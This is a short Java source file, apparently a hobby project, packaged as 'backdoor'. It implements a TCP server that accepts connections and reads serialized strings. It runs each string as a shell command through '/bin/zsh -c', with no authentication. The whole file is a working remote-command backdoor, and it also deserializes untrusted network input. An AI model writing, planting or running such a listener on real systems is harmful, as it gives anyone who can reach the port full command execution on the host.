package backdoor.java;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.BufferedReader;
import java.io.Closeable;
import java.io.InputStream;
import java.io.InputStreamReader;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.InetAddress;

import java.util.ArrayList;
import java.util.logging.Logger;


public class Server {
    
    public static void main(String[] args) throws IOException {

        final int PORT = Integer.parseInt(args[0]);

        byte[] b = InetAddress.getByName("localhost").getAddress();

        ServerSocket server = new ServerSocket(PORT);
        System.out.println("\nServidor conectado | " + b[0] + "." + b[1] + "." + b[2]+ "." + b[3] + ": " + PORT);
        
        ObjectOutputStream exit;
        
        while(true){
            
            try{
              
                Socket client = server.accept();
                System.out.println("Client conectado: " + client.getInetAddress().getHostAddress());
                new ClientThread(client).start();

                exit = new ObjectOutputStream(client.getOutputStream());
                exit.writeObject("Hello from Server!");
                
            } catch (Exception exception){ exception.printStackTrace(); break; }
        }

        server.close();

    }

}

class ClientThread extends Thread {

    private Socket client;

    public ClientThread(Socket client){
        this.client = client;
    }

    
    public void run() {

        try {
            
            ObjectInputStream entrada = new ObjectInputStream(client.getInputStream());
            // ObjectOutputStream exit = new ObjectOutputStream(client.getOutputStream());
            
            while(client.isConnected()){
                
                String msg = (String) entrada.readObject();
                System.out.println(msg);
                
                new Eval().executeCommand(msg);

                if("exit".equals(msg)) { entrada.close(); break; }

            }
        }
        catch(Exception exception) { exception.printStackTrace(); } 
    
    }
    
}


class Eval {

    private static final Logger log = Logger.getLogger(Eval.class.getName());

    public String executeCommand(final String command) throws IOException {

        final ArrayList<String> commands = new ArrayList<String>();
        commands.add("/bin/zsh");
        commands.add("-c");
        commands.add(command);

        BufferedReader bufferedReader = null;
        String logBuffer = "";

        try {
        
            final ProcessBuilder processBuilder = new ProcessBuilder(commands);
            final Process process = processBuilder.start();
            final InputStream inputStream = process.getInputStream();
            final InputStreamReader inputStreamReader = new InputStreamReader(inputStream);

            bufferedReader = new BufferedReader(inputStreamReader);

            String line;
            while((line = bufferedReader.readLine()) != null) { logBuffer += line + "\n"; }
            System.out.println(logBuffer);
            return logBuffer;
        
        } catch (IOException ioException){
        
            log.severe("Erro ao executar o comando shell: " + ioException.getMessage());
            throw ioException;
        
        } finally { secureClose(bufferedReader); }
    }

    private void secureClose(final Closeable resource){
        try{
            if(resource != null){
                resource.close();
            }
        } catch (IOException ioException){
            log.severe("Erro: " + ioException.getMessage());
        }
    }

}
